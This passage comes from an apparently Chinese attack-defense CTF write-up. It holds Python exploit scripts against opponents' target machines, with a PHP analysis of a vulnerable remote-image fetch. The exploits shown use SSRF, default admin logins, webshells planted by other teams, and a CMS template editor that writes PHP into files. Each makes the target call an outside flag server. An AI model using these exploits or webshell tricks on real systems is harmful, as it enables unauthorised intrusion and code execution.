class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// 两个都行</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp4</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp4 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># 黑名单检测</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp4.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 请求</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">f&quot;/filemanager/edit/img?file=/homepage/photo4.jpg&amp;url=http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin@admin.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin@admin.com&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    exp4.request(url=ip + <span class="string">&quot;admin&quot;</span>, method=<span class="string">&quot;POST&quot;</span>, data=data)</span><br><span class="line">    res = exp4.request(url=ip +<span class="string">&quot;files/homepage/photo4.jpg&quot;</span>, method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="comment"># 提交 flag</span></span><br><span class="line">    exp4.submit(res=res, pid=pid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp5</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp5 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># 黑名单检测</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp5.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 请求</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin@admin.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin@admin.com&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">f&quot;/filemanager/edit/img?file=/homepage/photo1.jpg&amp;url=http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    exp5.request(url=ip + <span class="string">&quot;admin&quot;</span>, method=<span class="string">&quot;POST&quot;</span>, params=params, data=data)</span><br><span class="line">    res = exp5.request(url=ip +<span class="string">&quot;files/homepage/photo1.jpg&quot;</span>, method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="comment"># 提交 flag</span></span><br><span class="line">    exp5.submit(res=res, pid=pid)</span><br></pre></td></tr></table></figure><p>这个exp大概是在两点写好的，那个时候我们大概掉到五六名了？交了之后和pwn爷爷们又把分数顽强的拉回去了一点，这个时候爷爷们已经在看可信计算了，第三个Web是Web3，当时已经放出而且被拿一血了。当时我让运维师傅去修洞，但是反而把靶机弄宕机了，所以我又硬着头皮去修洞了，师傅去看Web3的日志了。由于当时没有分析到洞，瞎几把patch我们最终没patch上，最后又去看Web3的流量分析了，最后三点左右写好了Web3的exp，离比赛结束剩下两小时左右，这里浪费了很多时间，Web背大锅。</p><p>Web3这道题比较有意思，它控制权限不能写入不死马，但是由于这道题是可以上传文件的，它成为了唯一一道（至少在我看到的）能写入马的题目，于是有很多队伍在这道题写马，但是由于没有做好加密，最后反而被我用上了，后面再提。由于这道题被某只队伍打全场了，所以就算我们没patch他也宕机了，我跟工作人员反馈后也没有补分数，宕机了挺久，血亏。</p><p>当时流量包抓到的exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /getRemoteImage.php?upfile=http:<span class="comment">//flagserver.top/index.php?token=xxxxxx%26123=aurora.gif</span></span><br></pre></td></tr></table></figure><p>这个exp写起来其实特别的简单，只有简单的请求，当时很快就写好了，但是由于是赛后分析，我还是分析一下漏洞的成因和具体路由的走向吧。</p><p><img src="https://oatmeal.vip/wp-content/uploads/2021/07/16266289581.png"></p><p>进入该文件，追踪upfile</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uri</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upfile&#x27;</span>]);</span><br><span class="line"><span class="comment">//Ajax提交的网址内容中如果包含了&amp;符号，上述函数会将其转成&amp;amp;导致地址解析不对，这里要转回来</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&amp;amp;&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="variable">$uri</span>);</span><br></pre></td></tr></table></figure><p>传入这里的upfile变量（注意这里GET和POST都可以，应该是有配置过或者赋值过，我没细找）使用htmlspecialchars过滤了一次，走了一次字符串替换，然后进入函数getRemoteImage()。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRemoteImage</span>(<span class="params"><span class="variable">$uri</span></span>) </span>&#123;</span><br><span class="line"><span class="comment">//忽略抓取时间限制</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//远程抓取图片配置</span></span><br><span class="line"><span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;savePath&quot;</span> =&gt; <span class="string">&quot;../../..&quot;</span> . UPLOADPATH, <span class="comment">//保存路径</span></span><br><span class="line"><span class="string">&quot;fileType&quot;</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.png&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.bmp&quot;</span>), <span class="comment">//文件允许格式</span></span><br><span class="line"><span class="string">&quot;fileSize&quot;</span> =&gt; <span class="number">3000</span>, <span class="comment">//文件大小限制，单位KB</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//ue_separate_ue  ue用于传递数据分割符号</span></span><br><span class="line"><span class="variable">$imgUrls</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;ue_separate_ue&quot;</span>, <span class="variable">$uri</span>);</span><br><span class="line"><span class="variable">$tmpNames</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$imgUrls</span> <span class="keyword">as</span> <span class="variable">$imgUrl</span>) &#123;</span><br><span class="line"><span class="comment">//http开头验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$imgUrl</span>, <span class="string">&quot;http&quot;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取请求头</span></span><br><span class="line"><span class="variable">$heads</span> = <span class="title function_ invoke__">get_headers</span>(<span class="variable">$imgUrl</span>);</span><br><span class="line"><span class="comment">//死链检测</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="number">0</span>], <span class="string">&quot;200&quot;</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="number">0</span>], <span class="string">&quot;OK&quot;</span>))) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//格式验证(扩展名验证和Content-Type验证)</span></span><br><span class="line"><span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$imgUrl</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, <span class="variable">$config</span>[<span class="string">&#x27;fileType&#x27;</span>]) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="string">&#x27;Content-Type&#x27;</span>], <span class="string">&quot;image&quot;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开输出缓冲区并获取远程图片</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;follow_location&#x27;</span> =&gt; <span class="literal">false</span>, // don<span class="string">&#x27;t follow redirects</span></span><br><span class="line"><span class="string">),</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">//请确保php.ini中的fopen wrappers已经激活</span></span><br><span class="line"><span class="string">readfile($imgUrl, false, $context);</span></span><br><span class="line"><span class="string">$img = ob_get_contents();</span></span><br><span class="line"><span class="string">ob_end_clean();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//大小验证</span></span><br><span class="line"><span class="string">$uriSize = strlen($img); //得到图片大小</span></span><br><span class="line"><span class="string">$allowSize = 1024 * $config[&#x27;</span>fileSize<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">if ($uriSize &gt; $allowSize) &#123;</span></span><br><span class="line"><span class="string">array_push($tmpNames, &quot;error&quot;);</span></span><br><span class="line"><span class="string">continue;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//创建保存位置</span></span><br><span class="line"><span class="string">$savePath = $config[&#x27;</span>savePath<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">$ymd = date(&quot;Ymd&quot;);</span></span><br><span class="line"><span class="string">$savePath .= &quot;Image/&quot; . $ymd . &quot;/&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (!is_dir($savePath)) &#123;</span></span><br><span class="line"><span class="string">mkdir($savePath, 0777);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//写入文件</span></span><br><span class="line"><span class="string">$tmpName = $savePath . rand(1, 10000) . time() . strrchr($imgUrl, &#x27;</span>.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">$fp2 = @fopen($tmpName, &quot;a&quot;);</span></span><br><span class="line"><span class="string">fwrite($fp2, $img);</span></span><br><span class="line"><span class="string">fclose($fp2);</span></span><br><span class="line"><span class="string">array_push($tmpNames, $tmpName);</span></span><br><span class="line"><span class="string">&#125; catch (Exception $e) &#123;</span></span><br><span class="line"><span class="string">array_push($tmpNames, &quot;error&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * 返回数据格式</span></span><br><span class="line"><span class="string"> * &#123;</span></span><br><span class="line"><span class="string"> *   &#x27;</span>url<span class="string">&#x27;   : &#x27;</span>新地址一ue_separate_ue新地址二ue_separate_ue新地址三<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> *   &#x27;</span>srcUrl<span class="string">&#x27;: &#x27;</span>原始地址一ue_separate_ue原始地址二ue_separate_ue原始地址三<span class="string">&#x27;，</span></span><br><span class="line"><span class="string"> *   &#x27;</span>tip<span class="string">&#x27;   : &#x27;</span>状态提示<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> * &#125;</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$url = ROOTPATH . &#x27;</span>/<span class="string">&#x27; . strrchr(implode(&quot;ue_separate_ue&quot;, $tmpNames), &#x27;</span>upload<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo &quot;&#123;&#x27;</span>url<span class="string">&#x27;:&#x27;</span><span class="string">&quot; . <span class="subst">$url</span> . &quot;</span><span class="string">&#x27;,&#x27;</span>tip<span class="string">&#x27;:&#x27;</span>远程图片抓取成功！<span class="string">&#x27;,&#x27;</span>srcUrl<span class="string">&#x27;:&#x27;</span><span class="string">&quot; . <span class="subst">$uri</span> . &quot;</span><span class="string">&#x27;&#125;&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>先是写定了文件上传目录在upload下，分别做了http请求头限制、检测访问是否200、以及限制了读取的文件的文件拓展名（这里可以通过get提交参数绕过）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$imgUrl</span>, <span class="string">&quot;http&quot;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取请求头</span></span><br><span class="line"><span class="variable">$heads</span> = <span class="title function_ invoke__">get_headers</span>(<span class="variable">$imgUrl</span>);</span><br><span class="line"><span class="comment">//死链检测</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="number">0</span>], <span class="string">&quot;200&quot;</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="number">0</span>], <span class="string">&quot;OK&quot;</span>))) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//格式验证(扩展名验证和Content-Type验证)</span></span><br><span class="line"><span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$imgUrl</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, <span class="variable">$config</span>[<span class="string">&#x27;fileType&#x27;</span>]) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="string">&#x27;Content-Type&#x27;</span>], <span class="string">&quot;image&quot;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以通过缓冲区读入文件内容，依然是用readfile读取了远程并写入$img，并最后写入文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开输出缓冲区并获取远程图片</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;follow_location&#x27;</span> =&gt; <span class="literal">false</span>, // don<span class="string">&#x27;t follow redirects</span></span><br><span class="line"><span class="string">),</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">//请确保php.ini中的fopen wrappers已经激活</span></span><br><span class="line"><span class="string">readfile($imgUrl, false, $context);</span></span><br><span class="line"><span class="string">$img = ob_get_contents();</span></span><br><span class="line"><span class="string">ob_end_clean();</span></span><br></pre></td></tr></table></figure><p>这里的文件名会通过时间函数获取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建保存位置</span></span><br><span class="line"><span class="variable">$savePath</span> = <span class="variable">$config</span>[<span class="string">&#x27;savePath&#x27;</span>];</span><br><span class="line"><span class="variable">$ymd</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Ymd&quot;</span>);</span><br><span class="line"><span class="variable">$savePath</span> .= <span class="string">&quot;Image/&quot;</span> . <span class="variable">$ymd</span> . <span class="string">&quot;/&quot;</span>;</span><br></pre></td></tr></table></figure><p>同理exp也是可以直接获取时间的，但是有更快的方法，上传文件后会返回远程文件抓取成功的提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#123;&#x27;url&#x27;:&#x27;&quot;</span> . <span class="variable">$url</span> . <span class="string">&quot;&#x27;,&#x27;tip&#x27;:&#x27;远程图片抓取成功！&#x27;,&#x27;srcUrl&#x27;:&#x27;&quot;</span> . <span class="variable">$uri</span> . <span class="string">&quot;&#x27;&#125;&quot;</span>; </span><br></pre></td></tr></table></figure><p>按照这个格式正则匹配即可，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp3</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp3 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># 黑名单检测</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp3.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 请求</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;upfile&quot;</span>: <span class="string">f&quot;http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&amp;123=aurora.gif&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res1 = exp3.request(url=ip + <span class="string">&quot;getRemoteImage.php&quot;</span>, method=<span class="string">&quot;GET&quot;</span>, params=params)</span><br><span class="line">    path = re.findall(<span class="string">&quot;&#x27;url&#x27;:&#x27;([\s\S]*)&#x27;,&#x27;tip&#x27;&quot;</span>, res1.text)[<span class="number">0</span>]</span><br><span class="line">    res2 = exp3.request(url=ip + path, method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="comment"># 提交 flag</span></span><br><span class="line">    exp3.submit(res=res2, pid=pid) </span><br></pre></td></tr></table></figure><p>三点左右出的，大概这个时候队伍的爷爷已经把可信计算AK了，于是我们又神奇的拉回了第四名。</p><p>这段时间又出了插曲，有一只打全场的队伍把很多靶机都打挂了，我们也是其中之一，后来宕机没补分，我们又重置了，血亏一波。</p><p>后面就比较无聊了，检查各个队伍发来的流量找exp，这个时候大概也没有新的exp了，倒是在靶机里找到了别人种的马，有几个是有加密的，有几个是直接调用file_get_content的，这几个我们都利用不上，但是找到了两个直接明文弱密码的，很舒服的上车了。</p><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp6</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp6 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># 黑名单检测</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp6.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 请求</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;1&quot;</span>: <span class="string">f&quot;var_dump(file_get_contents(&#x27;http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&#x27;));&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = exp6.request(url=ip + <span class="string">&quot;.1.php&quot;</span>, method=<span class="string">&quot;POST&quot;</span>, data=data)</span><br><span class="line">    <span class="comment"># 提交 flag</span></span><br><span class="line">    exp6.submit(res=res, pid=pid)</span><br></pre></td></tr></table></figure><p>exp2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp7</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp7 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># 黑名单检测</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp7.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 请求</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="string">f&quot;echo file_get_contents(&#x27;http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = exp7.request(url=ip + <span class="string">&quot;cache/blog_x5tar.phtml&quot;</span>, method=<span class="string">&quot;GET&quot;</span>, params=params)</span><br><span class="line">    <span class="comment"># 提交 flag</span></span><br><span class="line">    exp7.submit(res=res, pid=pid) </span><br></pre></td></tr></table></figure><p>恰了一波红利，感谢大师傅们送flag。</p><p>最后北邮的师傅们囤了一个可信计算的flag打到了第五名，我们最后是第六名，师傅们tql。</p><hr><p>补充一下，在看到了<a href="https://www.bilibili.com/video/BV1F44y1m7Cz">Xenny师傅对CISCN的复盘</a>之后，又发现了Web3自己没有找到的exp，这里设为exp8。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp8</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp8 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># 黑名单检测</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp8.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 请求 1</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;act&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pwd&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    exp8.request(url=ip + <span class="string">&#x27;admini/login.php&#x27;</span>, method=<span class="string">&quot;GET&quot;</span>, params=params)</span><br><span class="line">    <span class="comment"># 请求 2</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;fileName&#x27;</span>: <span class="string">&#x27;./index/article/article_3.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;fileCode&#x27;</span>: <span class="string">f&#x27;&#x27;&#x27;&lt;?php print_r(file_get_contents(&#x27;http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&#x27;))?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;changeskin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;saveFileCode&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    exp8.request(url=ip + <span class="string">&#x27;admini/index.php&#x27;</span>, method=<span class="string">&quot;POST&quot;</span>, params=params, data=data)</span><br><span class="line">    <span class="comment"># 请求 3</span></span><br><span class="line">    res = exp8.request(url=ip + <span class="string">&#x27;skins/doccms_model_1/index/article/article_3.php&#x27;</span>, method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="comment"># 提交 flag</span></span><br><span class="line">    